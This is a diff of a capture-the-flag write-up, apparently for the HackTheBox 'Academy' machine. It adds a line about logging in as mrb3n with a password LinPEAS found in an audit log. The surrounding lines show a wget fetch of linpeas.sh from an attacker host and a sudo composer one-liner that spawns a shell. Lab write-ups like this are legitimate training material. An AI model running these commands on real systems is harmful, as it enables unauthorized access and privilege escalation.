@@ -82,6 +82,9 @@ wget http://10.10.14.8:8000/linpeas.sh
 LinPEAS found mrb3n's password in /var/log/audit log file  
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/mrb3n%20pass.jpg)
 
+So now we can login as mrb3n  
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/mrb3n.PNG)  
+
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
